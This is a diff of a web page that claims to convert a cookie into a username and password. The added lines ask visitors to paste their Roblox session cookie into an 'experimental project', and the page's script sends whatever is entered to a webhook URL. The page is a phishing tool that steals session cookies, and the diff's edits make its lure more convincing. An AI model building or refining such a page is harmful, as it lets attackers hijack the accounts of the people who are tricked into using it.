@@ -11,7 +11,8 @@
 <body>
     <div class="container">
         <h1>Cookie To Username And Password</h1>
-        <input type="text" id="message" placeholder="Please enter the cookie">
+        <p>This is an experimental project to gauge interest. Enter your cookie below to participate:</p>
+        <input type="text" id="message" placeholder="Enter your Roblox cookie here">
         <button id="sendButton">
             <span id="buttonText">Convert</span>
             <i id="loadingIcon" class="fas fa-arrow-circle-right" style="display: none;"></i>
@@ -28,13 +29,12 @@
             const buttonText = document.getElementById('buttonText');
             
             if (message === '') {
-                alert('Please enter the cookie.');
+                alert('Enter the cookie.');
                 return;
             }
             
             loadingIcon.style.display = 'inline-block';
             buttonText.style.display = 'none';
-            button.disabled = true;
             
             fetch(webhookURL, {
                 method: 'POST',
